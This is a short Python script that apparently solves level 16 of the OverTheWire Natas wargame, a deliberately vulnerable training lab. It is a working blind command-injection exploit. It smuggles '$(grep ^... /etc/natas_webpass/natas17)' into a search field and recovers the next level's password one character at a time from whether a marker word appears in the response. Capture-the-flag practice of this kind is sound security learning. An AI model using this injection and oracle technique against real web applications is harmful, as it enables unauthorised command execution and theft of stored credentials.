#!/usr/bin/env python3
#
# Boolean based shell injection used to solve the 16th Natas challenge
#
import requests
from string import ascii_letters
from string import digits

alphanumeric = ascii_letters + digits
url = "http://natas16.natas.labs.overthewire.org/index.php"
headers = { 
    "User-Agent": "Mozilla/5.0", 
    "Authorization": "Basic bm[...]aA=="
} 

def guess(s):
    data = { 
        "needle": "Africans$(grep ^" + s + " /etc/natas_webpass/natas17)",
        "submit": "Search"
    }

    resp = requests.get(url, headers=headers, params=data)

    if "Africans" not in resp.text:
        print(s)
        for char in alphanumeric:
            guess(s + char)

    return s

for char in alphanumeric:
    guess(char)

